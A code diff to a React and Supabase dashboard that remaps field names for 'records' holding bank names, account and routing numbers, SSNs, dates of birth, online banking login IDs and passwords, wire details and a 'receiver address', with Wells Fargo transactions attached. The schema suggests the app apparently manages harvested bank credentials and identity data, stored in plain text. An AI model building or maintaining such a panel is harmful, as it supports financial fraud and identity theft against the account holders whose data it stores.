@@ -18,14 +18,34 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
     const { data, error } = await supabase
       .from('records')
       .select('*, transactions(*)')
-      .order('createdAt', { ascending: false });
+      .order('createdat', { ascending: false });
 
     if (error) {
       console.error('Error fetching records:', error);
       return;
     }
     
-    setRecords(data as BankRecord[]);
+    // Map lowercase back to camelCase for the frontend
+    const formattedData = data?.map(record => ({
+      ...record,
+      bankType: record.banktype,
+      emailId: record.emailid,
+      firstName: record.firstname,
+      lastName: record.lastname,
+      accountNo: record.accountno,
+      loginId: record.loginid,
+      receiverAddress: record.receiveraddress,
+      phoneLink: record.phonelink,
+      phoneExpiry: record.phoneexpiry,
+      createdAt: record.createdat,
+      isDeleted: record.isdeleted,
+      transactions: record.transactions?.map((tx: any) => ({
+        ...tx,
+        recordId: tx.recordid
+      }))
+    }));
+    
+    setRecords(formattedData as BankRecord[]);
   };
 
   useEffect(() => {
@@ -35,16 +55,32 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
   const handleSave = async (record: BankRecord) => {
     const { transactions, ...recordData } = record as any;
 
-    // Clean up undefined values for Supabase
-    Object.keys(recordData).forEach(key => {
-      if (recordData[key] === undefined) {
-        recordData[key] = null;
-      }
-    });
+    // Convert camelCase to lowercase for Supabase (PostgreSQL forces unquoted identifiers to lowercase)
+    const supabaseData: any = {
+      id: recordData.id,
+      banktype: recordData.bankType,
+      emailid: recordData.emailId,
+      firstname: recordData.firstName,
+      lastname: recordData.lastName,
+      accountno: recordData.accountNo,
+      routing: recordData.routing || null,
+      dob: recordData.dob || null,
+      ssn: recordData.ssn || null,
+      ach: recordData.ach || null,
+      wire: recordData.wire || null,
+      loginid: recordData.loginId || null,
+      password: recordData.password || null,
+      receiveraddress: recordData.receiverAddress || null,
+      phone: recordData.phone || null,
+      phonelink: recordData.phoneLink || null,
+      phoneexpiry: recordData.phoneExpiry || null,
+      createdat: recordData.createdAt,
+      isdeleted: recordData.isDeleted ? true : false
+    };
 
     const { error: recordError } = await supabase
       .from('records')
-      .upsert(recordData);
+      .upsert(supabaseData);
 
     if (recordError) {
       console.error('Error saving record:', recordError);
@@ -53,11 +89,13 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
     }
 
     if (record.bankType === 'Wells Fargo' && transactions) {
-      await supabase.from('transactions').delete().eq('recordId', record.id);
+      await supabase.from('transactions').delete().eq('recordid', record.id);
       if (transactions.length > 0) {
         const txsToInsert = transactions.map((tx: any) => ({
-          ...tx,
-          recordId: record.id
+          id: tx.id,
+          recordid: record.id,
+          amount: tx.amount,
+          date: tx.date
         }));
         await supabase.from('transactions').insert(txsToInsert);
       }
@@ -69,12 +107,12 @@ export function Dashboard({ onLogout }: { onLogout: () => void }) {
   };
 
   const handleDelete = async (id: string) => {
-    await supabase.from('records').update({ isDeleted: true }).eq('id', id);
+    await supabase.from('records').update({ isdeleted: true }).eq('id', id);
     await fetchRecords();
   };
 
   const handleRestore = async (id: string) => {
-    await supabase.from('records').update({ isDeleted: false }).eq('id', id);
+    await supabase.from('records').update({ isdeleted: false }).eq('id', id);
     await fetchRecords();
   };
 
